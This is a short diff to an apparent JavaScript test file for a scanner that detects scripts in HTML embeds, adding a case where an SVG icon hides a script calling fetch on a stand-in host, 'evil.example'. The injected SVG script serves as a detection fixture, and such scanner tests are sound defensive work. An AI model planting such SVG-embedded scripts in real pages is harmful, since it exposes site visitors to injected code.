@@ -91,6 +91,11 @@ const scriptFindings = findHtmlEmbedScripts(
     embed('icon w-embed', '<svg></svg>')
 );
 assert.deepEqual(scriptFindings.map((finding) => finding.source), ['.track: inline script', '.lib: https://cdn.example/x.js']);
+assert.deepEqual(
+  findHtmlEmbedScripts(embed('icon w-embed', '<svg><script>fetch("https://evil.example/")</script><path d="M0"/></svg>')).map((finding) => finding.source),
+  ['.icon: inline SVG script'],
+  'SVG-namespace scripts are reported too'
+);
 assert.ok(scriptFindings.every((finding) => finding.policy === HTML_EMBED_SCRIPT_POLICY));
 assert.ok(
   !findProhibitedMarketplaceCustomCode(embed('track w-embed', '<script>init()</script>')).some(
